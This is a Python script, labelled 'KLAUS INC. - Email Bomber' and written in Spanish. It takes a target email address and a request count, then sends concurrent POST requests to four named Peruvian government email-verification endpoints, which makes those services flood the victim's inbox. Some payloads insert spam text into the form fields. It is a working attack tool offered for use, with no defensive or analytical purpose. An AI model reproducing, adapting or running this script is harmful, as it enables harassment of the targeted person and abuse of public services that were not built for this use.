import requests
import json
import argparse
import platform
import os
import concurrent.futures

# Detectar el sistema operativo
if platform.system() == "Windows":
    clear_command = "cls"
else:
    clear_command = "clear"

# Ejecutar el comando para limpiar la consola
os.system(clear_command)

# Imprimir el mensaje de bienvenida
print("                                      ***********************************************                                        ")
print("                                      *                                             *                                        ")
print("                                      *          KLAUS INC. - Email Bomber          *                                        ")
print("                                      *                 By: BotVHS                  *                                        ")
print("                                      *                                             *                                        ")
print("                                      ***********************************************                                        ")

parser = argparse.ArgumentParser(description='Realizar peticiones a la API de Verificación de correo')
parser.add_argument('email', nargs='?', type=str, help='Correo electrónico al que se enviarán las peticiones')
parser.add_argument('cantidad', nargs='?', type=int, help='Cantidad de peticiones que se desean realizar')
args = parser.parse_args()

if not args.email:
    email = input('Ingresa el correo electrónico al que se enviarán las peticiones: ')
else:
    email = args.email

if not args.cantidad:
    cantidad = int(input('Ingresa la cantidad de peticiones que se desean realizar: '))
else:
    cantidad = args.cantidad

url1 = 'https://mesadepartes.pronabec.gob.pe/Registro/Verificacion_correo'
payload1 = {"codigo": "999999", "correo": email, "nombre": "Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS"}
headers1 = {"Content-Type": "application/json"}

url2 = 'https://5c2aselbaend78.mtc.gob.pe/api/Account/validacionCorreoElectronicoweb'
payload2 = {"Email":email}
headers2 = {"Content-Type": "application/json"}

url3 = 'https://tramidigital.regionlalibertad.gob.pe/Home/Verificar'
payload3 = {"correo":email}

url4 = 'https://webexterno.sutran.gob.pe/WebExterno/Pages/SolicitudAIP/TramiteGeneral.aspx/ValidaCorreo'
payload4 = {"codVerif":"Atención, Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS","correo":email,"nroDoc":"44444444"}


def make_request(url, payload, headers):
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        if response.status_code == 200:
            return True
        else:
            print(f"Error en la peticion a {email}. Codigo de estado: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"No se ha podido procesar esta petición")
    return False

contador_peticiones = 0
with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    futures = []
    for url, payload, headers in [(url1, payload1, headers1), (url2, payload2, headers2), (url3, payload3, {}), (url4, payload4, {})]:
        for i in range(cantidad):
            if contador_peticiones >= cantidad:
                break

            futures.append(executor.submit(make_request, url, payload, headers))
            contador_peticiones += 1


        if contador_peticiones >= cantidad:
            break

    for future in concurrent.futures.as_completed(futures):
        if future.result():
            print(f"Peticion finalizada exitosamente")
        else:
            print(f"Peticion finalizada con error")
